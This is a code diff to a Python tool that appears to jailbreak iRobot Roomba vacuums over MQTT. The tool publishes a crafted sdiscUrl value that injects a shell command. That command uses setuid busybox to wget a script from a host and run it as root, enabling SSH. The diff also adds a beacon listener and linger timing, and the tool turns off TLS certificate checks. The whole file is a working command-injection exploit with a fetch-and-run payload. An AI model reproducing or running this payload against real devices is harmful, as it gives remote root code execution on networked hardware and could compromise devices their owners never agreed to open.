@@ -1,12 +1,15 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-import threading
-import paho.mqtt.client as mqtt
-import ssl
-import json
 import argparse
+import json
+import os
 import socket
+import ssl
+import sys
+import threading
 import time
+
+import paho.mqtt.client as mqtt
 
 # connectivity_manager rejects any sdiscUrl longer than this (cmp r0,0xbf at 0x101d0).
 SDISCURL_MAX_BYTES = 191
@@ -28,6 +31,7 @@ LOCAL_IP = None
 mqttc = None
 PENDING_URLS: list[str] = []
 SEND_DELAY = 1.5
+LINGER = 15.0
 DELTA = "delta"
 RUNJAILED_HOME = "/data/opt/irobot/persistent/opt/runjailed"
 AVAILABLE_CMD_SPACE = 1
@@ -53,13 +57,15 @@ def runAsRoot(cmd: str, file:str="I"):
     raise NotImplementedError("Root commands are unsupported: sendCmd only configures a discovery URL")
 
 
-def enableSshUrl(host: str, port: int = 8899, busybox: str = "/bin/busybox") -> str:
+def enableSshUrl(host: str, port: int = 8899, beacon_port: int = 8883,
+                 busybox: str = "/bin/busybox") -> str:
     """Build the sdiscUrl payload that makes connectivity_manager fetch and run
     enableSSH.sh as root (busybox is setuid and allowed for the apps user).
 
     The whole payload must stay within SDISCURL_MAX_BYTES.
     """
-    remote = f"wget -qO/tmp/e http://{host}:{port}/enableSSH.sh;sh /tmp/e {host} {port}"
+    remote = (f"wget -qO/tmp/e http://{host}:{port}/enableSSH.sh;"
+              f"sh /tmp/e {host} {port} {beacon_port}")
     url = f"https://$({busybox} su -c '{remote}')"
     if len(url.encode()) > SDISCURL_MAX_BYTES:
         raise ValueError(f"payload is {len(url.encode())} bytes, max {SDISCURL_MAX_BYTES}")
@@ -67,7 +73,7 @@ def enableSshUrl(host: str, port: int = 8899, busybox: str = "/bin/busybox") -> 
 
 
 def on_connect(client, userdata, flags, reason_code, properties):
-    print("Connected successfully!")
+    print("Connected successfully!", flush=True)
     client.subscribe("$SYS/#")
     if PENDING_URLS:
         urls, PENDING_URLS[:] = list(PENDING_URLS), []
@@ -78,10 +84,14 @@ def _send_all(client, urls, delay):
     for url in urls:
         try:
             ok = sendCmd(url)
-            print(f"sendCmd rc={ok} bytes={len(url.encode())}: {url}")
+            print(f"sendCmd rc={ok} bytes={len(url.encode())}: {url}", flush=True)
         except (ValueError, RuntimeError) as exc:
-            print(f"sendCmd failed for {url!r}: {exc}")
+            print(f"sendCmd failed for {url!r}: {exc}", flush=True)
         time.sleep(delay)
+    # The beacon HTTP server lives in this process: stay up until the robot reports back.
+    if LINGER:
+        print(f"listening for beacons for {LINGER:g}s ...", flush=True)
+        time.sleep(LINGER)
     client.disconnect()
 
 def on_message(client, userdata, msg):
@@ -105,6 +115,13 @@ class RunjailedHTTPHandler(BaseHTTPRequestHandler):
         
         self.send_header("Content-type", "text/plain")
         self.end_headers()
+
+        # Also append to a log so callers that redirect stdout (oneclick-ssh.sh)
+        # can observe the beacons without racing the process's own output.
+        beacon_log = os.environ.get("RUNJAILED_BEACON_LOG")
+        if beacon_log:
+            with open(beacon_log, "a") as fh:
+                fh.write(self.path + "\n")
         
         if "done/downloading" in self.path:
           print("[SUCCESS] Downloaded all scripts, now unlocking!")
@@ -123,29 +140,44 @@ class RunjailedHTTPHandler(BaseHTTPRequestHandler):
           print(f"[SUCCESS] Downloaded roomba::unjailed v{ver} to Roomba.")
 
 def main():
-    global LOCAL_IP, httpd, mqttc, SEND_DELAY
+    global LOCAL_IP, httpd, mqttc, SEND_DELAY, LINGER
+    # Redirected stdout is block-buffered, which hides progress from callers polling the log.
+    if hasattr(sys.stdout, "reconfigure"):
+        sys.stdout.reconfigure(line_buffering=True)
     parser = argparse.ArgumentParser("runjailed")
     parser.add_argument("--ip", "-i", dest="ip", help="Your robot's IP", required=True, type=str)
-    parser.add_argument("--blid", "-b", dest="blid", help="Your robot's BLID", required=True, type=str)
-    parser.add_argument("--password", "-p", dest="password", help="Your robot's password", required=True, type=str)
+    parser.add_argument("--blid", "-b", dest="blid", help="Your robot's BLID (or $ROOMBA_BLID)",
+                        default=os.environ.get("ROOMBA_BLID"), type=str)
+    parser.add_argument("--password", "-p", dest="password",
+                        help="Your robot's password (or $ROOMBA_PASSWORD)",
+                        default=os.environ.get("ROOMBA_PASSWORD"), type=str)
     parser.add_argument("--callback", "-c", dest="cb", help="Your computer's LAN IP", required=False, type=str)
+    parser.add_argument("--beacon-port", dest="beacon_port", type=int, default=8883,
+                        help="local port for the HTTP beacon server (default 8883)")
     parser.add_argument("--send", dest="send", action="append", default=[], metavar="URL",
                         help="publish this state.sdiscUrl value after connecting (repeatable)")
     parser.add_argument("--enable-ssh", dest="enable_ssh", metavar="HOST[:PORT]",
                         help="publish the payload that runs enableSSH.sh on the robot as root")
     parser.add_argument("--send-delay", dest="send_delay", type=float, default=1.5,
                         help="seconds between publishes (default 1.5)")
+    parser.add_argument("--linger", dest="linger", type=float, default=15,
+                        help="seconds to keep the beacon server up after sending (default 15)")
 
     args = parser.parse_args()
+    if not args.blid:
+        parser.error("--blid is required (or set ROOMBA_BLID)")
+    if not args.password:
+        parser.error("--password is required (or set ROOMBA_PASSWORD)")
 
     urls = list(args.send)
     if args.enable_ssh:
         host, _, port = args.enable_ssh.partition(":")
-        urls.append(enableSshUrl(host, int(port or 8899)))
+        urls.append(enableSshUrl(host, int(port or 8899), args.beacon_port,
+                                 busybox=os.environ.get("ROOMBA_BUSYBOX", "/bin/busybox")))
 
     LOCAL_IP = args.cb or get_local_ip()
 
-    server_address = ('', 8883)
+    server_address = ('', args.beacon_port)
     httpd = HTTPServer(server_address, RunjailedHTTPHandler)
 
     t = threading.Thread(target=httpd.serve_forever, daemon=True)
@@ -156,6 +188,7 @@ def main():
     mqttc.on_message = on_message
     PENDING_URLS[:] = urls
     SEND_DELAY = args.send_delay
+    LINGER = args.linger
 
     mqttc.tls_set(cert_reqs=ssl.CERT_NONE)
     mqttc.tls_insecure_set(True) # The certificate is now expired. Expired on Dec 31 2025.
